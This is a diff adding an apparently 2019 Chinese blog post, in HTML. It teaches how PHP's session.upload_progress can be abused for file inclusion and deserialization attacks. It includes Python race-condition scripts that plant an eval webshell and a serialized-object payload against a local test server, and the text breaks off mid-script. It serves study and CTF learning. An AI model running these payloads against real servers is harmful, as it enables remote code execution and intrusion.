@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。 php中的session.upload_progress这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。 在php.ini有以下几个默认选项 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TGAO&#39;s Blog">
+<meta property="og:url" content="https://TGAOUT.github.io/2019/05/29/利用session.upload_progress进行文件包含和反序列化渗透/index.html">
+<meta property="og:site_name" content="TGAO&#39;s Blog">
+<meta property="og:description" content="前言本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。 php中的session.upload_progress这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。 在php.ini有以下几个默认选项 12">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png%21small">
+<meta property="og:image" content="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png%21small">
+<meta property="og:image" content="https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png%21small">
+<meta property="og:updated_time" content="2019-05-29T11:56:33.111Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TGAO&#39;s Blog">
+<meta name="twitter:description" content="前言本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。 php中的session.upload_progress这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。 在php.ini有以下几个默认选项 12">
+<meta name="twitter:image" content="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png%21small">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://TGAOUT.github.io/2019/05/29/利用session.upload_progress进行文件包含和反序列化渗透/">
+
+
+
+
+
+  <title> | TGAO's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TGAO's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/05/29/利用session.upload_progress进行文件包含和反序列化渗透/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TGAO">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TGAO's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-29T19:57:47+08:00">
+                2019-05-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</strong></p>
+<h2 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+<p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p>
+<blockquote>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</blockquote>
+<h2 id="session相关配置及session反序列化"><a href="#session相关配置及session反序列化" class="headerlink" title="session相关配置及session反序列化"></a>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html</a></p>
+<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p>
+</blockquote>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>
+<h2 id="利用session-upload-progress进行文件包含利用"><a href="#利用session-upload-progress进行文件包含利用" class="headerlink" title="利用session.upload_progress进行文件包含利用"></a>利用session.upload_progress进行文件包含利用</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>php5.5.38</p>
+<p>win10</p>
+<p>关于session相关的一切配置都是默认值</p>
+</blockquote>
+<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=$_GET[&apos;file&apos;];</span><br><span class="line">include &quot;$b&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>问题一</strong></p>
+<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>
+<p><strong>解答一</strong></p>
+<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session  ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。   并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。     </p>
+<p><strong>问题二</strong></p>
+<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
+<p><strong>如何进行rce呢？</strong></p>
+<p><strong>解答二</strong></p>
+<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">sessid = <span class="string">'TGAO'</span></span><br><span class="line">data = &#123;<span class="string">"cmd"</span>:<span class="string">"system('whoami');"</span>&#125;</span><br><span class="line">def write(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">'http://127.0.0.1:5555/test56.php'</span>, data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>&#125;, files=&#123;<span class="string">'file'</span>: (<span class="string">'tgao.txt'</span>,f)&#125;, cookies=&#123;<span class="string">'PHPSESSID'</span>: sessid&#125; )</span><br><span class="line">def read(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">'http://127.0.0.1:5555/test56.php?file=session/sess_'</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'tgao.txt'</span> in resp.text:</span><br><span class="line">            <span class="keyword">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[+++++++++++++]retry"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+<p>效果如下图</p>
+<p><a href="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png%21small" alt="利用session.upload_progress进行文件包含和反序列化渗透"></a></p>
+<h3 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">    $payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;</span><br><span class="line">        $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">        parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $payload = unserialize($payload);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">    &lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p>
+<p>利用思路一样，这里就不再说了，网上也有相应的解法。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>利用条件</strong></p>
+<blockquote>
+<p>\1. 存在文件包含漏洞</p>
+<p>\2. 知道session文件存放路径，可以尝试默认路径</p>
+<p>\3. 具有读取和写入session文件的权限</p>
+</blockquote>
+<h2 id="利用session-upload-progress进行反序列化攻击"><a href="#利用session-upload-progress进行反序列化攻击" class="headerlink" title="利用session.upload_progress进行反序列化攻击"></a>利用session.upload_progress进行反序列化攻击</h2><h3 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>php5.5.38</p>
+<p>win10</p>
+<p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值</p>
+</blockquote>
+<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"Asia/Shanghai"</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Door</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle=<span class="keyword">new</span> TimeNow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeNow</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的访问时间:"</span>.<span class="string">"  "</span>.date(<span class="string">'Y-m-d H:i:s'</span>,time());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">IP</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = <span class="string">'echo $_SERVER["REMOTE_ADDR"];'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>问题一</strong></p>
+<p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p>
+<p><strong>解答一</strong></p>
+<p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p>
+<p>另外，与文件包含利用一样，也需要进行竞争。</p>
+<h3 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Door</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> IP();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeNow</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的访问时间:"</span>.<span class="string">"  "</span>.date(<span class="string">'Y-m-d H:i:s'</span>,time());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">IP</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;ip='payload';</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip=<span class="string">'phpinfo();'</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;ip='print_r(scandir('/'));';</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Door();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">$c=addslashes($b);</span><br><span class="line">$d=str_replace(<span class="string">"O:4:"</span>,<span class="string">"|O:4:"</span>,$c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其此利用exp.py脚本进行竞争</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    </span><br><span class="line">    f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> *<span class="number">1024</span>*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        et.wait()</span><br><span class="line">        url = <span class="string">'http://'</span>+ip+<span class="string">':'</span>+str(port)+<span class="string">'/test5.php'</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'DNT'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=20190506'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        proxy = &#123;</span><br><span class="line">        <span class="string">'http'</span>: <span class="string">'127.0.0.1:8080'</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">'file'</span>  <span class="string">r'|O:4:\"Door\":1:&#123;s:6:\"handle\";O:2:\"IP\":1:&#123;s:2:\"ip\";s:10:\"phpinfo();\";&#125;&#125;'</span>,f,<span class="string">'text/plain'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) <span class="comment">#,proxies=proxy</span></span><br><span class="line">        resp.encoding=<span class="string">"utf-8"</span></span><br><span class="line">     